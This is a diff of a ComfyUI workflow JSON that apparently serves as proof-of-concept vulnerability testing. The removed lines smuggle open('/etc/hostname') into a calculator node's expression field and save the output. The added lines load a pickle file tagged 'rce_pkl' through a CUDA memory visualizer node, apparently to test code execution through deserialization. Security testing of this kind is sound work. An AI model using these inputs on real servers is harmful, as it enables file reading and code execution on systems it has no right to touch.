@@ -1,49 +1,9 @@
 {
-  "10": {
-    "class_type": "PrimitiveInt",
-    "inputs": {
-      "value": 1
-    }
-  },
-  "11": {
-    "class_type": "PrimitiveInt",
-    "inputs": {
-      "value": 2
-    }
-  },
   "1": {
-    "class_type": "SimpleCalculatorKJ",
+    "class_type": "VisualizeCUDAMemoryHistory",
     "inputs": {
-      "expression": "open('/etc/hostname')",
-      "a": [
-        "10",
-        0
-      ],
-      "b": [
-        "11",
-        0
-      ]
-    }
-  },
-  "8": {
-    "class_type": "SomethingToString",
-    "inputs": {
-      "input": [
-        "1",
-        0
-      ]
-    }
-  },
-  "2": {
-    "class_type": "SaveStringKJ",
-    "inputs": {
-      "string": [
-        "8",
-        0
-      ],
-      "filename_prefix": "eval_out",
-      "output_folder": "output",
-      "file_extension": ".txt"
+      "snapshot_path": "/mnt/md0/ai/ComfyUI/input/read_shell_out.txt.pkl",
+      "unique_id": "rce_pkl"
     }
   }
 }
